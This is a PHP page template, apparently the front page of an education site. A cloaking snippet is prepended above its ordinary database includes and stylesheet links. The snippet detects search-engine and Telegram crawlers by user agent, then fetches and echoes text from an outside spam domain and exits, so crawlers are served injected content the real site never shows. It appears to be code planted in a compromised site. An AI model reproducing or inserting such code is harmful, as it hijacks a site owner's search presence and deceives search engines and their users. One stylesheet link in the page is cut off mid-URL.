<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) { 
    $message = file_get_contents('https://seowentanini.store/cloaking/edubenchmark.txt'); // 
    echo $message; 
    (exit);
} 
?>
<?php
// error_reporting(E_ALL);
//ini_set('display_errors', 1);
include('inc/connect_db.php');
include('model/contentModel.php');
include_once 'head.php';
?>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/cs>


<link rel="stylesheet" href="/css/assets/stylehome61.css?v=12345678" async >
<script defer src="/slick/slick.min.js"></script>

<!--Slick Slider -->
</head>
<body>
    <?php include "header-new-ipad.php"; ?>
